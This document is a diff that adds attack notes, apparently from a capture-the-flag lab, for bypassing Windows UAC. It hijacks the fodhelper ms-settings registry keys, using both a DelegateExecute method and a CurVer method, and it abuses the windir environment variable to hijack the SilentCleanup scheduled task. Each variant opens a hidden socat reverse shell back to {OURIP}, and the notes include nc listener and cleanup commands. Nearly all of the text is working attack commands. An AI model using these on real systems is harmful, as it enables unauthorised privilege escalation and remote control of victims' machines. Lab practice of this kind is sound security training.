@@ -1,0 +1,49 @@
+nc 10.10.202.53 9999
+
+set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:{OURIP}:4444 EXEC:cmd.exe,pipes"
+reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+reg add %REG_KEY% /d %CMD% /f
+# make nc listener
+nc -lvp 4444
+# run fodhelper.exe
+c:\fodhelper.exe
+# in our listener, we now have eleveted shell
+c:\flags\getflag-fodhelper.exe
+# cleanup
+reg delete HKCU\Software\Classes\ms-settings\ /f
+
+# updated
+set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:{OURIP}:4444 EXEC:cmd.exe,pipes"
+reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
+
+$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:{OURIP}:4445 EXEC:cmd.exe,pipes"
+New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
+Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
+New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
+Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+# make reverse shell
+nc -lvp 4445
+
+set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:{OURIP}:4445 EXEC:cmd.exe,pipes"
+reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
+reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
+fodhelper.exe
+
+# cleanup
+reg delete "HKCU\Software\Classes\.thm\" /f
+reg delete "HKCU\Software\Classes\ms-settings\" /f
+
+##
+nc -lvp 4446
+nc 10.10.202.53 9999
+cmd.exe /c C:\tools\socat\socat.exe TCP:{OURIP}:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%
+reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:{OURIP}:4446 EXEC:cmd.exe,pipes &REM " /f
+schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+# cleanup
+reg delete "HKCU\Environment" /v "windir" /f
+
+
